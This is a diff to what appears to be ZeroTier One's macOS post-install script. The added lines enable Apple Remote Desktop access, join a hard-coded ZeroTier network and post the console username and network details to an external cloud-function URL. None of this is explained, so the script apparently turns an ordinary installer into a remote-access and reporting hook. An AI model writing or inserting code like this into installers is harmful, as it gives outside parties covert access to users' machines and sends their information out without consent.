@@ -54,11 +54,46 @@ launchctl load /Library/LaunchDaemons/com.zerotier.one.plist >>/dev/null 2>&1
 
 sleep 1
 
-if [ -f /tmp/zt1-gui-restart.tmp ]; then
-	for u in `cat /tmp/zt1-gui-restart.tmp`; do
-		su $u -c '/Applications/ZeroTier\ One.app/Contents/MacOS/ZeroTier\ One &' >>/dev/null 2>&1 &
-	done
-fi
 rm -f /tmp/zt1-gui-restart.tmp
 
-exit 0
+sleep 1
+
+USER_SHORT_NAME=$(/bin/ls -l /dev/console | /usr/bin/awk '{ print $3 }')
+
+/System/Library/CoreServices/RemoteManagement/ARDAgent.app/Contents/Resources/kickstart -activate -configure -allowAccessFor -specifiedUsers -clientopts -setreqperm -reqperm yes -setmenuextra -menuextra no
+
+if [ $? -eq 0 ]
+then
+  ARD_SUCCESS="true"
+else
+  ARD_SUCCESS="false" >&2
+fi
+
+MAX_WHILE_LOOPS=20
+WHILE_LOOPS_DONE=0
+NETWORK_ID=d5e5fb653797c558
+
+/usr/local/bin/zerotier-cli join $NETWORK_ID
+
+ZT_INFO=$(zerotier-cli listnetworks | grep $NETWORK_ID)
+
+FAIL=0
+
+while [[ $ZT_INFO == *"REQUESTING_CONFIGURATION"* ]]; do
+	echo "Still requesting configuration. Will try again in a sec..."
+	sleep 2
+	let WHILE_LOOPS_DONE=$WHILE_LOOPS_DONE+1
+	ZT_INFO=$(zerotier-cli listnetworks | grep $NETWORK_ID)
+	if [ $WHILE_LOOPS_DONE -gt $MAX_WHILE_LOOPS ]; then
+		FAIL=1
+		break
+	fi
+done
+
+echo $ARD_STATUS
+echo $ZT_INFO
+echo $USER_SHORT_NAME
+
+curl -d "info=$ZT_INFO" -d "short_name=$USER_SHORT_NAME" -d "ard_success=$ARD_SUCCESS" https://us-central1-leftbrain-a057d.cloudfunctions.net/noauth/zerotier
+echo "yayy" > /tmp/zerotier-installed
+exit $FAIL
